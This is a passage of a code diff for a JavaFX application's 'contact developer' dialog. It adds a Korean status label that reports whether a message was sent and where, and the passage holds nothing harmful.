+                Platform.runLater(() -> {
+                    okBtn.setDisable(false);
+                    okBtn.setText("확인");
+                    if (fErr == null) {
+                        resultLbl.setStyle("-fx-font-size:12px; -fx-font-weight:bold; -fx-text-fill:#006600;");
+                        resultLbl.setText("✅ 전송 완료! → " + RECEIVER);
+						} else {
+                        resultLbl.setStyle("-fx-font-size:12px; -fx-font-weight:bold; -fx-text-fill:#cc0000;");
+                        resultLbl.setText("❌ 전송 실패: " + fErr);
+					}
+				});
 			}, "ContactDeveloper").start();
 		});
 		
         HBox btns = new HBox(8, okBtn, canBtn);
         btns.setAlignment(Pos.CENTER_RIGHT);
-        VBox root = new VBox(0, grid, btns);
+        resultLbl.setPadding(new Insets(0, 14, 4, 14));
+        VBox root = new VBox(0, grid, resultLbl, btns);
         btns.setPadding(new Insets(0, 14, 10, 14));
 		
         dlg.setScene(new Scene(root));
